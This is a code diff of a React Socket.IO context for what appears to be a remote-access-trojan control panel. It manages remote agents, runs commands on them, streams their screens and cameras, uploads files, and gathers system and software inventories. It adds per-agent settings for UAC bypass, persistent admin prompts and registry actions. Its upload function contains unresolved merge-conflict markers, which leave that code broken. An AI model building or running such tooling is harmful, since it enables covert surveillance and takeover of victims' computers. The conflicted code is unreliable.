@@ -36,6 +36,10 @@ interface SocketContextType {
   notifications: Notification[];
   selectedAgent: string | null;
   setSelectedAgent: (agentId: string | null) => void;
+  lastActivity?: { type: string; details?: string; agentId?: string | null; timestamp?: number };
+  setLastActivity: (type: string, details?: string, agentId?: string | null) => void;
+  getLastFilePath: (agentId: string | null) => string;
+  setLastFilePath: (agentId: string | null, path: string) => void;
   sendCommand: (agentId: string, command: string) => void;
   startStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
   stopStream: (agentId: string, type: 'screen' | 'camera' | 'audio') => void;
@@ -48,6 +52,33 @@ interface SocketContextType {
   login: (password: string, otp?: string) => Promise<{ success?: boolean; data?: any; error?: string }>;
   logout: () => Promise<void>;
   agentMetrics: Record<string, { cpu: number; memory: number; network: number }>;
+  agentConfig: Record<string, {
+    agent?: {
+      id?: string;
+      enableUACBypass?: boolean;
+      persistentAdminPrompt?: boolean;
+      uacBypassDebug?: boolean;
+      requestAdminFirst?: boolean;
+      maxPromptAttempts?: number;
+    };
+    bypasses?: {
+      enabled?: boolean;
+      methods?: Record<string, boolean>;
+    };
+    registry?: {
+      enabled?: boolean;
+      actions?: Record<string, boolean>;
+    };
+    updatedAt?: Date;
+  }>;
+  requestSystemInfo: (detailLevel?: 'basic' | 'standard' | 'full') => void;
+  requestNetworkInfo: () => void;
+  requestInstalledSoftware: () => void;
+  systemInfo?: any;
+  networkInfo?: any;
+  installedSoftware?: any[];
+  lastProcessOperation?: any;
+  lastProcessDetails?: any;
 }
 
 const SocketContext = createContext<SocketContextType | null>(null);
@@ -139,6 +170,39 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
   const [commandOutput, setCommandOutput] = useState<string[]>([]);
   const [agentMetrics, setAgentMetrics] = useState<Record<string, { cpu: number; memory: number; network: number }>>({});
   const lastEmitRef = useRef<Record<string, number>>({});
+  const [lastActivity, _setLastActivity] = useState<{ type: string; details?: string; agentId?: string | null; timestamp?: number }>(() => {
+    try {
+      const raw = localStorage.getItem('nch:lastActivity');
+      return raw ? JSON.parse(raw) : { type: 'idle', details: '', agentId: null, timestamp: Date.now() };
+    } catch {
+      return { type: 'idle', details: '', agentId: null, timestamp: Date.now() };
+    }
+  });
+  const lastFilePathsRef = useRef<Record<string, string>>({});
+  const [agentConfig, setAgentConfig] = useState<Record<string, {
+    agent?: {
+      id?: string;
+      enableUACBypass?: boolean;
+      persistentAdminPrompt?: boolean;
+      uacBypassDebug?: boolean;
+      requestAdminFirst?: boolean;
+      maxPromptAttempts?: number;
+    };
+    bypasses?: {
+      enabled?: boolean;
+      methods?: Record<string, boolean>;
+    };
+    registry?: {
+      enabled?: boolean;
+      actions?: Record<string, boolean>;
+    };
+    updatedAt?: Date;
+  }>>({});
+  const [systemInfo, setSystemInfo] = useState<any>();
+  const [networkInfo, setNetworkInfo] = useState<any>();
+  const [installedSoftware, setInstalledSoftware] = useState<any[]>();
+  const [lastProcessOperation, setLastProcessOperation] = useState<any>();
+  const [lastProcessDetails, setLastProcessDetails] = useState<any>();
 
   const addCommandOutput = useCallback((output: string) => {
     console.log('🔍 SocketProvider: addCommandOutput called with:', output);
@@ -152,6 +216,30 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
   const clearCommandOutput = useCallback(() => {
     setCommandOutput([]);
   }, []);
+
+  const setLastActivity = useCallback((type: string, details?: string, agentId?: string | null) => {
+    const entry = { type, details, agentId, timestamp: Date.now() };
+    _setLastActivity(entry);
+    try { localStorage.setItem('nch:lastActivity', JSON.stringify(entry)); } catch {}
+  }, []);
+  
+  const getLastFilePath = useCallback((agentId: string | null) => {
+    const key = agentId ? `fm:lastPath:${agentId}` : 'fm:lastPath:';
+    try {
+      const mem = agentId ? (lastFilePathsRef.current[agentId] || '') : '';
+      const ls = localStorage.getItem(key) || '';
+      return (mem || ls || '/');
+    } catch {
+      return '/';
+    }
+  }, []);
+  
+  const setLastFilePath = useCallback((agentId: string | null, path: string) => {
+    const key = agentId ? `fm:lastPath:${agentId}` : 'fm:lastPath:';
+    if (agentId) lastFilePathsRef.current[agentId] = path;
+    try { localStorage.setItem(key, path || '/'); } catch {}
+    setLastActivity('files', path || '/', agentId || null);
+  }, [setLastActivity]);
 
   useEffect(() => {
     // Connect to Socket.IO server
@@ -194,6 +282,17 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
 
     // Add debug event listener to see all events
     socketInstance.onAny((eventName, ...args) => {
+      // Reduce noisy logs for high-frequency streaming events
+      if (eventName && /^(screen_frame(_bin)?_chunk|camera_frame(_bin)?_chunk)$/.test(String(eventName))) {
+        const payload = args[0] || {};
+        const aid = String(payload?.agent_id || '');
+        try {
+          const raw = aid ? localStorage.getItem(`stream:last:${aid}`) : null;
+          const saved = raw ? JSON.parse(raw) : {};
+          const type = eventName.startsWith('screen') ? 'screen' : 'camera';
+          if (!saved?.[type]) return;
+        } catch {}
+      }
       console.log(`🔍 SocketProvider: Received event '${eventName}':`, args);
       if (eventName === 'command_result') {
         console.log('🔍 SocketProvider: COMMAND_RESULT EVENT RECEIVED!', args);
@@ -242,6 +341,45 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       addCommandOutput(`Reconnection Error: ${error.message || 'Unknown error'}`);
     });
 
+    socketInstance.on('config_update', (data: any) => {
+      try {
+        const agentId = typeof data?.agent?.id === 'string' ? data.agent.id : (typeof data?.agent_id === 'string' ? data.agent_id : '');
+        const bypassesEnabled = typeof data?.bypasses?.enabled === 'boolean' ? data.bypasses.enabled : '';
+        const registryEnabled = typeof data?.registry?.enabled === 'boolean' ? data.registry.enabled : '';
+        const msg = [
+          'CONFIG UPDATE',
+          agentId ? `agent=${agentId}` : '',
+          bypassesEnabled !== '' ? `bypasses=${bypassesEnabled}` : '',
+          registryEnabled !== '' ? `registry=${registryEnabled}` : '',
+        ].filter(Boolean).join(' | ');
+        addCommandOutput(msg);
+        if (agentId) {
+          const next = {
+            agent: {
+              id: agentId,
+              enableUACBypass: Boolean(data?.agent?.enableUACBypass ?? true),
+              persistentAdminPrompt: Boolean(data?.agent?.persistentAdminPrompt ?? false),
+              uacBypassDebug: Boolean(data?.agent?.uacBypassDebug ?? false),
+              requestAdminFirst: Boolean(data?.agent?.requestAdminFirst ?? false),
+              maxPromptAttempts: Number(data?.agent?.maxPromptAttempts ?? 3)
+            },
+            bypasses: {
+              enabled: Boolean(data?.bypasses?.enabled ?? true),
+              methods: Object(data?.bypasses?.methods ?? {})
+            },
+            registry: {
+              enabled: Boolean(data?.registry?.enabled ?? true),
+              actions: Object(data?.registry?.actions ?? {})
+            },
+            updatedAt: new Date()
+          };
+          setAgentConfig(prev => ({ ...prev, [agentId]: next }));
+        }
+      } catch (e) {
+        addCommandOutput('CONFIG UPDATE');
+      }
+    });
+
     // Agent management events
     socketInstance.on('agent_list_update', (agentData: Record<string, any>) => {
       try {
@@ -286,6 +424,22 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       } catch (error) {
         console.error('Error processing agent list update:', error);
       }
+    });
+
+    socketInstance.on('process_operation_result', (data: any) => {
+      setLastProcessOperation(data);
+    });
+    socketInstance.on('process_details_response', (data: any) => {
+      setLastProcessDetails(data);
+    });
+    socketInstance.on('system_info_response', (data: any) => {
+      setSystemInfo(data);
+    });
+    socketInstance.on('network_info_response', (data: any) => {
+      setNetworkInfo(data);
+    });
+    socketInstance.on('installed_software_response', (data: any) => {
+      setInstalledSoftware(data?.software || []);
     });
 
     // Room joining confirmation
@@ -404,6 +558,12 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     
     socketInstance.on('screen_frame_chunk', (data: any) => {
       try {
+        // Gate by saved streaming state
+        try {
+          const raw = data?.agent_id ? localStorage.getItem(`stream:last:${data.agent_id}`) : null;
+          const saved = raw ? JSON.parse(raw) : {};
+          if (!saved?.screen) return;
+        } catch {}
         const base = `${data.agent_id || 'unknown'}:screen`;
         const seq = typeof data?.frame_id === 'number' ? data.frame_id : Number(data?.frame_id || 0);
         if (!latestFrameSeq[base] || seq > latestFrameSeq[base]) latestFrameSeq[base] = seq;
@@ -442,6 +602,11 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     
     socketInstance.on('camera_frame_chunk', (data: any) => {
       try {
+        try {
+          const raw = data?.agent_id ? localStorage.getItem(`stream:last:${data.agent_id}`) : null;
+          const saved = raw ? JSON.parse(raw) : {};
+          if (!saved?.camera) return;
+        } catch {}
         const base = `${data.agent_id || 'unknown'}:camera`;
         const seq = typeof data?.frame_id === 'number' ? data.frame_id : Number(data?.frame_id || 0);
         if (!latestFrameSeq[base] || seq > latestFrameSeq[base]) latestFrameSeq[base] = seq;
@@ -480,6 +645,11 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     
     socketInstance.on('screen_frame_bin_chunk', (data: any) => {
       try {
+        try {
+          const raw = data?.agent_id ? localStorage.getItem(`stream:last:${data.agent_id}`) : null;
+          const saved = raw ? JSON.parse(raw) : {};
+          if (!saved?.screen) return;
+        } catch {}
         const base = `${data.agent_id || 'unknown'}:screen`;
         const seq = typeof data?.frame_id === 'number' ? data.frame_id : Number(data?.frame_id || 0);
         if (!latestFrameSeq[base] || seq > latestFrameSeq[base]) latestFrameSeq[base] = seq;
@@ -526,6 +696,11 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     
     socketInstance.on('camera_frame_bin_chunk', (data: any) => {
       try {
+        try {
+          const raw = data?.agent_id ? localStorage.getItem(`stream:last:${data.agent_id}`) : null;
+          const saved = raw ? JSON.parse(raw) : {};
+          if (!saved?.camera) return;
+        } catch {}
         const base = `${data.agent_id || 'unknown'}:camera`;
         const seq = typeof data?.frame_id === 'number' ? data.frame_id : Number(data?.frame_id || 0);
         if (!latestFrameSeq[base] || seq > latestFrameSeq[base]) latestFrameSeq[base] = seq;
@@ -793,6 +968,13 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       lastEmitRef.current[k] = now;
       socket.emit('execute_command', { agent_id: agentId, command });
       addCommandOutput(`Starting ${type} stream for ${agentId}`);
+      setLastActivity(`stream:${type}`, `started`, agentId);
+      try {
+        const key = `stream:last:${agentId}`;
+        const raw = localStorage.getItem(key);
+        const prev = raw ? JSON.parse(raw) : {};
+        localStorage.setItem(key, JSON.stringify({ ...prev, [type]: true }));
+      } catch {}
     }
   }, [socket, connected, addCommandOutput]);
 
@@ -819,10 +1001,18 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       lastEmitRef.current[k] = now;
       socket.emit('execute_command', { agent_id: agentId, command });
       addCommandOutput(`Stopping ${type} stream for ${agentId}`);
+      setLastActivity(`stream:${type}`, `stopped`, agentId);
+      try {
+        const key = `stream:last:${agentId}`;
+        const raw = localStorage.getItem(key);
+        const prev = raw ? JSON.parse(raw) : {};
+        localStorage.setItem(key, JSON.stringify({ ...prev, [type]: false }));
+      } catch {}
     }
   }, [socket, connected, addCommandOutput]);
 
   const uploadFile = useCallback((agentId: string, file: File, destinationPath: string) => {
+<<<<<<< HEAD
     if (!socket || !connected) return;
 
     const destinationFilePath = normalizeDestinationPath(destinationPath, file.name);
@@ -833,20 +1023,48 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     (async () => {
       let chunksSent = 0;
       const yieldEveryChunks = 4;
+=======
+    if (!socket) return;
+    const destinationDir = normalizeDestinationDir(destinationPath, file.name);
+    addCommandOutput(`Uploading ${file.name} (${file.size} bytes) to ${agentId}:${destinationDir || '(default)'}`);
+    const uploadId = `ul_${Date.now()}_${Math.random().toString(16).slice(2)}`;
+    const chunkSize = 256 * 1024;
+    const chunkDelayMs = 8;
+    (async () => {
+      socket.emit('upload_file_start', {
+        agent_id: agentId,
+        upload_id: uploadId,
+        filename: file.name,
+        destination: destinationDir,
+        total_size: file.size,
+      });
+      // Wait for agent-ready if forwarded; otherwise timeout continues
+      await new Promise<void>((resolve) => {
+        const onReady = (data: any) => {
+          if (String(data?.upload_id || '') === uploadId || String(data?.filename || '') === file.name) {
+            socket.off('upload_ready', onReady);
+            resolve();
+          }
+        };
+        socket.on('upload_ready', onReady);
+        setTimeout(() => {
+          socket.off('upload_ready', onReady);
+          resolve();
+        }, 1500);
+      });
+>>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
       for (let offset = 0; offset < file.size; offset += chunkSize) {
         const slice = file.slice(offset, offset + chunkSize);
         const buffer = await slice.arrayBuffer();
         const bytes = new Uint8Array(buffer);
         const chunkB64 = bytesToBase64(bytes);
-
         socket.emit('upload_file_chunk', {
           agent_id: agentId,
+          upload_id: uploadId,
           filename: file.name,
-          data: chunkB64,
-          chunk: chunkB64,
-          chunk_data: chunkB64,
-          offset,
+          destination_path: destinationDir,
           total_size: file.size,
+<<<<<<< HEAD
           destination_path: destinationFilePath
         });
 
@@ -854,12 +1072,23 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
         if (chunksSent % yieldEveryChunks === 0) {
           await new Promise((resolve) => setTimeout(resolve, 0));
         }
+=======
+          chunk: chunkB64,
+          offset,
+        });
+        await new Promise((r) => setTimeout(r, chunkDelayMs));
+>>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
       }
-
-      socket.emit('upload_file_end', {
+      socket.emit('upload_file_complete', {
         agent_id: agentId,
+        upload_id: uploadId,
         filename: file.name,
+<<<<<<< HEAD
         destination_path: destinationFilePath
+=======
+        destination: destinationDir,
+        total_size: file.size,
+>>>>>>> 65064d9d58fead668dd69e7827f2cdb398cd35c1
       });
     })().catch((error) => {
       addCommandOutput(`Upload failed: ${error?.message || String(error)}`);
@@ -925,10 +1154,35 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     setAuthenticated(false);
     clearCommandOutput();
     try {
+      const keysToRemove: string[] = [];
+      for (let i = 0; i < localStorage.length; i++) {
+        const k = localStorage.key(i) || '';
+        if (k.startsWith('fm:lastPath:') || k.startsWith('stream:last:') || k === 'nch:lastActivity') {
+          keysToRemove.push(k);
+        }
+      }
+      keysToRemove.forEach(k => localStorage.removeItem(k));
+    } catch {}
+    try {
       // Redirect to login page (server-rendered)
       window.location.href = '/login';
     } catch {}
-  }, [socket, clearCommandOutput]);
+  }, [socket, connected, addCommandOutput]);
+
+  const requestSystemInfo = useCallback((detailLevel: 'basic' | 'standard' | 'full' = 'full') => {
+    if (!socket || !connected || !selectedAgent) return;
+    socket.emit('get_system_info', { agent_id: selectedAgent, detail_level: detailLevel });
+  }, [socket, connected, selectedAgent]);
+
+  const requestNetworkInfo = useCallback(() => {
+    if (!socket || !connected || !selectedAgent) return;
+    socket.emit('get_network_info', { agent_id: selectedAgent });
+  }, [socket, connected, selectedAgent]);
+
+  const requestInstalledSoftware = useCallback(() => {
+    if (!socket || !connected || !selectedAgent) return;
+    socket.emit('get_installed_software', { agent_id: selectedAgent });
+  }, [socket, connected, selectedAgent]);
 
   const value: SocketContextType = {
     socket,
@@ -937,6 +1191,8 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     agents,
     selectedAgent,
     setSelectedAgent,
+    lastActivity,
+    setLastActivity,
     sendCommand,
     startStream,
     stopStream,
@@ -949,7 +1205,18 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     login,
     logout,
     agentMetrics,
+    agentConfig,
     notifications,
+    requestSystemInfo,
+    requestNetworkInfo,
+    requestInstalledSoftware,
+    systemInfo,
+    networkInfo,
+    installedSoftware,
+    lastProcessOperation,
+    lastProcessDetails,
+    getLastFilePath,
+    setLastFilePath,
   };
 
   return (
